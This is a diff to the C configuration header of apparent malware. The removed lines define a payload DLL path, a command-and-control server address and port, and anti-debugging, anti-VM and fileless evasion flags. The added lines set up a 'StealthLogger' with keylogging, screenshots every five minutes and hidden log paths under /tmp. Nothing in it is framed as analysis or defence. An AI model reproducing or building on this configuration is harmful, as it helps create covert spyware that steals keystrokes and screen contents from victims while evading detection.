@@ -1,16 +1,23 @@
 #ifndef PAYLOAD_CONFIG_H
 #define PAYLOAD_CONFIG_H
 
-// Hardcoded DLL path for WMI method
-#define DLL_PATH "C:\\Windows\\System32\\payload.dll"
+// Payload configuration
+#define PAYLOAD_NAME "StealthLogger"
+#define PAYLOAD_VERSION "1.0.0"
+#define PAYLOAD_AUTHOR "FaZe0wNsJeW"
 
-// C2 Server Configuration
-#define C2_SERVER "192.168.1.100"
-#define C2_PORT 443
+// Logging settings
+#define LOG_FILE "/tmp/.system.log"
+#define LOG_MAX_SIZE 1048576 // 1MB
+#define LOG_FLUSH_INTERVAL 30 // seconds
 
-// Evasion Settings
-#define ENABLE_ANTI_DEBUG 1
-#define ENABLE_ANTI_VM 1
-#define ENABLE_FILELESS 1
+// Keylogger settings
+#define KEYLOG_ENABLED 1
+#define KEYLOG_BUFFER_SIZE 256
 
-#endif
+// Screenshot settings
+#define SCREENSHOT_ENABLED 1
+#define SCREENSHOT_INTERVAL 300 // 5 minutes
+#define SCREENSHOT_PATH "/tmp/.screenshots/"
+
+#endif // PAYLOAD_CONFIG_H
